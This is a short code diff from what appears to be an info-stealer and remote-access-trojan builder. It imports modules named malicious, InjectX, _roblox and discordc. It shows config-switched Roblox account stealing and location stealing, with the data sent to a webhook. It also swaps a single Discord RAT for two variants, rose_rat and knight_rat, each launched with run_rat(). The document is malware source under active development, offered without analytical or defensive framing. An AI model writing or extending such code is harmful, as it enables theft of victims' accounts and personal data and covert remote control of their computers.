@@ -2,7 +2,8 @@ import _webhook
 import discordc
 import informations
 import malicious
-import rat
+import rose_rat
+import knight_rat
 import InjectX
 import startup
 import _roblox
@@ -866,5 +867,8 @@ if cc.get_roblox_stealing() is True:
 if cc.get_location_stealing() is True:
     _webh.locations_webhook(ii.global_info())
 
-if cc.get_discord_rat() is True:
-    rat.run_rat()
+if cc.get_rose_discord_rat() is True:
+    rose_rat.run_rat()
+    
+if cc.get_knight_discord_rat() is True:
+    knight_rat.run_rat()
